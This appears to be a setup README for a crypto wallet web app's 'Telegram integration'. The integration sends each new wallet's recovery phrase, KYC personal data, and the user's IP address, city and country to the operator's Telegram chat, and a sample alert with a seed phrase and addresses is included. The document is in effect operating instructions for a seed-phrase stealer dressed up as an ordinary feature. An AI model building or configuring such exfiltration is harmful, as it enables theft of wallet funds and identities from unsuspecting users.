# 🚀 Telegram Integration - Quick Setup (5 Minutes)

## Step 1: Create Bot (2 min)
```
Telegram → @BotFather → /newbot → Copy Token
```

## Step 2: Get Chat ID (2 min)
```
Message your bot
Visit: https://api.telegram.org/bot{TOKEN}/getUpdates
Copy: chat_id from response
```

## Step 3: Configure (1 min)
Create `.env.local` in project root:
```env
VITE_TELEGRAM_BOT_TOKEN=your_token_here
VITE_TELEGRAM_CHAT_ID=your_chat_id_here
```

## Step 4: Restart (30 sec)
```bash
# Stop and restart dev server
npm run dev
```

## Step 5: Test (30 sec)
```
Open: http://localhost:5173/telegram-test
Click: "Test Connection"
Check: Telegram for message
```

✅ **Done!** Notifications now include:
- Wallet info + seed phrase
- KYC personal data
- **Your IP address** ⭐
- **Your City** ⭐
- **Your Country** ⭐
- Timestamp & location details

---

## Example Notification

```
🔐 New Wallet Created

Wallet Name: MyWallet
Recovery Phrase: abandon abandon abandon...
XRP: rN7n7otQDd6FczFgLdSqtcsAUxDkw6fzRH
EVM: 0x742d35Cc6634C0532925a3b844Bc9e7595f3bEb9
Solana: 9B5X4z6Kx5L4M3N2O1P0Q9R8S7T6U5V4W3X2Y1Z0
TRON: TRrP29vfNFTT2aFaJ8JhT8kC6N7U8V9W0X1Y2Z3A4B
Bitcoin: 1A1z7agoat7FRN1JRUcVzocEGGAqJJzNWn

📍 Location:
IP: 203.0.113.42
City: New York
Country: United States
Timezone: America/New_York

Timestamp: 2025-02-02T10:30:45Z
```

---

## 🆘 Quick Troubleshooting

| Problem | Solution |
|---------|----------|
| "Credentials not configured" | Restart server after creating `.env.local` |
| No message arrives | Verify chat ID: `https://api.telegram.org/bot{TOKEN}/getUpdates` |
| Invalid token | Regenerate from @BotFather using `/revoke` then `/newbot` |
| Location shows "Unknown" | This is normal if API is blocked - notifications still work |

---

## 📚 Full Documentation

For detailed setup: See [TELEGRAM_FULL_SETUP.md](./TELEGRAM_FULL_SETUP.md)
